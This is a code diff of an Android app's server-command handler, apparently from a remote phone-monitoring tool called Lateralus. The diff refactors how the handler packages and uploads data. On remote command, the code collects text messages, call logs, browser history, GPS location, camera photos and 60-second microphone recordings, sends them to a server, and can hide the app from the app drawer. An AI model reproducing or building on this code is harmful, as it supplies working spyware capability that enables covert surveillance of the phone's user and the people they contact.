@@ -21,7 +21,6 @@ import xyz.lateralus.components.readers.InternetHistoryReader;
 import xyz.lateralus.components.readers.PhonecallReader;
 import xyz.lateralus.components.readers.TextMessageReader;
 
-import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -35,6 +34,7 @@ public class LateralusMessageHandler {
     public static final String KEY_AUDIO     = "audio_recording";
     public static final String KEY_MSG       = "message";
     public static final String KEY_ERROR_MSG = "error_message";
+    public static final String KEY_MSG_ID    = "message_id";
 
     public static final String CMD_GET_TEXT_MESSAGES = "get_text_messages";
     public static final String CMD_GET_PHONECALLS    = "get_phonecalls";
@@ -73,6 +73,9 @@ public class LateralusMessageHandler {
         try{
             String cmd = data.getString(KEY_CMD);
 
+            // TODO: check for empty commands
+            // TODO: take in a message id
+
             // commands that don't send data
             if(CMD_SHOW_APP.equals(cmd) || CMD_HIDE_APP.equals(cmd)){
                 cmdAppDrawer(cmd);
@@ -83,7 +86,8 @@ public class LateralusMessageHandler {
                 sendLateralusErrorMessage(_ctx, "Permission Denied: Wifi Only - wifi is not connected");
                 return;
             }
-            switch(cmd){
+
+            switch(cmd) {
                 case CMD_GET_TEXT_MESSAGES:
                     cmdGetTextMessages();
                     break;
@@ -103,11 +107,12 @@ public class LateralusMessageHandler {
                     cmdLocation(cmd);
                     break;
                 case CMD_RECORD_AUDIO:
-                    cmdRecordAudio(data);
+                    cmdRecordAudio();
                 default:
                     Log.e(TAG, "Invalid Command: " + cmd);
-                    sendLateralusErrorMessage(_ctx, "Invalid command from server: " + cmd);
+                    //sendLateralusErrorMessage(_ctx, "Invalid command from server: " + cmd);
             }
+
         }
         catch(JSONException e){
             Log.e(TAG, "JSON Error from GCM request");
@@ -123,13 +128,17 @@ public class LateralusMessageHandler {
             return;
         }
         try {
-            JSONArray array = new JSONArray();
+            JSONObject root = new JSONObject();
+
+            // device info
             DataReader dr = new DeviceReader(_ctx);
-            array.put(dr.getData());
+            root.put(dr.getRootKey(), dr.getData());
+
+            // messages
             dr = new TextMessageReader(_ctx);
-            array.put(dr.getData());
-            JSONObject root = new JSONObject().put(KEY_ROOT, array);
-            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, root, null);
+            root.put(dr.getRootKey(), dr.getData());
+
+            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
         }
         catch(Exception e){
             Log.e(TAG, "JSON Error");
@@ -143,13 +152,17 @@ public class LateralusMessageHandler {
             return;
         }
         try{
-            JSONArray array = new JSONArray();
+            JSONObject root = new JSONObject();
+
+            // device info
             DataReader dr = new DeviceReader(_ctx);
-            array.put(dr.getData());
+            root.put(dr.getRootKey(), dr.getData());
+
+            // phonecalls
             dr = new PhonecallReader(_ctx);
-            array.put(dr.getData());
-            JSONObject root = new JSONObject().put(KEY_ROOT, array);
-            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, root, null);
+            root.put(dr.getRootKey(), dr.getData());
+
+            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
         }
         catch(Exception e){
             Log.e(TAG, "JSON Error");
@@ -163,13 +176,17 @@ public class LateralusMessageHandler {
             return;
         }
         try{
-            JSONArray array = new JSONArray();
+            JSONObject root = new JSONObject();
+
+            // device info
             DataReader dr = new DeviceReader(_ctx);
-            array.put(dr.getData());
+            root.put(dr.getRootKey(), dr.getData());
+
+            // history
             dr = new InternetHistoryReader(_ctx);
-            array.put(dr.getData());
-            JSONObject root = new JSONObject().put(KEY_ROOT, array);
-            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, root, null);
+            root.put(dr.getRootKey(), dr.getData());
+
+            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
         }
         catch(Exception e){
             Log.e(TAG, "JSON Error");
@@ -210,13 +227,13 @@ public class LateralusMessageHandler {
         });
     }
 
-    private void cmdRecordAudio(JSONObject data) {
+    private void cmdRecordAudio() {
         if(!_prefs.hasDataPermission(LateralusPreferences.PERMISSION_MICROPHONE)){
             sendLateralusErrorMessage(_ctx, "Permission Denied: Microphone");
             return;
         }
         try {
-            final int durationSeconds = (data.has("duration")) ? data.getInt("duration") : 60;
+            final int durationSeconds = 60; // TODO: allow custom duration
             _handler.post(new Runnable() {
                 @Override
                 public void run() {
@@ -267,12 +284,16 @@ public class LateralusMessageHandler {
 
     public static void sendLateralusMessage(Context ctx, String msg){
         try{
-            JSONArray jsonArray = new JSONArray();
-            DeviceReader dr = new DeviceReader(ctx);
-            jsonArray.put(dr.getData());
-            jsonArray.put(new JSONObject().put(KEY_MSG, msg));
-            JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
-            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, root, null);
+            JSONObject root = new JSONObject();
+
+            // device info
+            DataReader dr = new DeviceReader(ctx);
+            root.put(dr.getRootKey(), dr.getData());
+
+            // error msg
+            root.put(KEY_MSG, msg);
+
+            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
         }
         catch(Exception e){
             Log.e(TAG, "JSON Error");
@@ -282,12 +303,16 @@ public class LateralusMessageHandler {
 
     public static void sendLateralusErrorMessage(Context ctx, String msg){
         try{
-            JSONArray jsonArray = new JSONArray();
-            DeviceReader dr = new DeviceReader(ctx);
-            jsonArray.put(dr.getData());
-            jsonArray.put(new JSONObject().put(KEY_ERROR_MSG, msg));
-            JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
-            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, root, null);
+            JSONObject root = new JSONObject();
+
+            // device info
+            DataReader dr = new DeviceReader(ctx);
+            root.put(dr.getRootKey(), dr.getData());
+
+            // error msg
+            root.put(KEY_ERROR_MSG, msg);
+
+            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
         }
         catch(Exception e){
             Log.e(TAG, "JSON Error");
@@ -304,12 +329,16 @@ public class LateralusMessageHandler {
             try {
                 JSONObject jsonLoc = Locator.getJsonFromLocation(loc);
                 if(jsonLoc != null) {
-                    JSONArray jsonArray = new JSONArray();
-                    DeviceReader dr = new DeviceReader(_ctx);
-                    jsonArray.put(dr.getData());
-                    jsonArray.put(jsonLoc);
-                    JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
-                    LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, root, null);
+                    JSONObject root = new JSONObject();
+
+                    // device info
+                    DataReader dr = new DeviceReader(_ctx);
+                    root.put(dr.getRootKey(), dr.getData());
+
+                    // location
+                    root.put(Locator.getRootKey(), jsonLoc);
+
+                    LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
                 }
             }
             catch(Exception e){
@@ -336,13 +365,17 @@ public class LateralusMessageHandler {
         @Override
         public void onPhotoTaken(byte[] photoBytes) {
             try {
-                String photoStr = Base64.encodeToString(photoBytes, Base64.NO_WRAP);
-                JSONArray jsonArray = new JSONArray();
-                DeviceReader dr = new DeviceReader(_ctx);
-                jsonArray.put(dr.getData());
-                jsonArray.put(new JSONObject().put(KEY_PHOTO, photoStr));
-                JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
-                LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, root, null);
+                JSONObject root = new JSONObject();
+
+                // device info
+                DataReader dr = new DeviceReader(_ctx);
+                root.put(dr.getRootKey(), dr.getData());
+
+                // photo
+                String photoStr = Base64.encodeToString(photoBytes, Base64.DEFAULT);
+                root.put(KEY_PHOTO, photoStr);
+
+                LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
             }
             catch(Exception e){
                 Log.e(TAG, "JSON Error");
@@ -362,19 +395,23 @@ public class LateralusMessageHandler {
 
         @Override
         public void onErrorMessage(String msg) {
-            // TODO ?
+            sendLateralusErrorMessage(_ctx, msg);
         }
 
         @Override
         public void onFinishedRecording(byte[] audioBytes) {
             try {
+                JSONObject root = new JSONObject();
+
+                // device info
+                DataReader dr = new DeviceReader(_ctx);
+                root.put(dr.getRootKey(), dr.getData());
+
+                // audio
                 String audioStr = Base64.encodeToString(audioBytes, Base64.NO_WRAP);
-                JSONArray jsonArray = new JSONArray();
-                DeviceReader dr = new DeviceReader(_ctx);
-                jsonArray.put(dr.getData());
-                jsonArray.put(new JSONObject().put(KEY_AUDIO, audioStr));
-                JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
-                LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, root, null);
+                root.put(KEY_AUDIO, audioStr);
+
+                LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
             }
             catch(Exception e){
                 Log.e(TAG, "JSON Error");
